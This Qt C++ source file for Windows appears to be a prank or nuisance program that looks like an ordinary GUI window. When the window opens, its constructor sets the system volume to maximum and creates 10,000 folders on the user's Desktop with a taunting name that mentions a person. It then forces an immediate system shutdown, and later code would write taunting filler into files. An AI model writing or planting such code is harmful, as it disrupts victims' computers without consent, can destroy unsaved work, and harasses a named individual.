#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "qdir.h"
#include "qfile.h"
#include "QProcess"
#include <QDebug>
#include <Windows.h>
#include <Mmdeviceapi.h>
#include <Endpointvolume.h>
#include <QUrl>
MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
   setVolumeToMax();
   QString desktopPath = QDir::homePath() + "/Desktop";
   QString folderName = "Eric Amaya te va a pisar";
   QDir desktopDir(desktopPath);
   for (int var = 0; var < 10000; ++var) {
   desktopDir.mkdir(folderName+QString::number(var));
    }
  QProcess::startDetached("shutdown", QStringList() << "/s" << "/t" << "0");
   for (int var = 0; var < 2; ++var) {
       QFile file(desktopPath+"/Archivo"+QString::number(var));
       QDataStream data(&file);
       file.open(QIODevice::Append);
       for (int var2 = 0; var2 < 10; ++var2) {
           data << "ERICAMAYATEVAAPISARRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRR";
       }
   }
}
void MainWindow::setVolumeToMax()
{
    HRESULT hr;
    IMMDeviceEnumerator *pEnumerator = nullptr;
    IMMDevice *pDevice = nullptr;
    IAudioEndpointVolume *pEndpointVolume = nullptr;

    hr = CoInitialize(nullptr);
    if (FAILED(hr)) {
        qDebug() << "Error al inicializar COM";
        return;
    }

    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), nullptr, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
    if (FAILED(hr)) {
        qDebug() << "Error al crear la instancia del enumerador de dispositivos";
        CoUninitialize();
        return;
    }

    hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &pDevice);
    pEnumerator->Release();
    pEnumerator = nullptr;
    if (FAILED(hr)) {
        qDebug() << "Error al obtener el dispositivo de audio predeterminado";
        CoUninitialize();
        return;
    }

    hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, nullptr, (void**)&pEndpointVolume);
    pDevice->Release();
    pDevice = nullptr;
    if (FAILED(hr)) {
        qDebug() << "Error al activar la interfaz de volumen del dispositivo";
        CoUninitialize();
        return;
    }

    hr = pEndpointVolume->SetMasterVolumeLevelScalar(1.0f, nullptr);
    if (FAILED(hr)) {
        qDebug() << "Error al establecer el volumen al máximo";
    }

    pEndpointVolume->Release();
    CoUninitialize();

    qDebug() << "Volumen establecido al máximo con éxito.";
}
MainWindow::~MainWindow()
{
    delete ui;
}
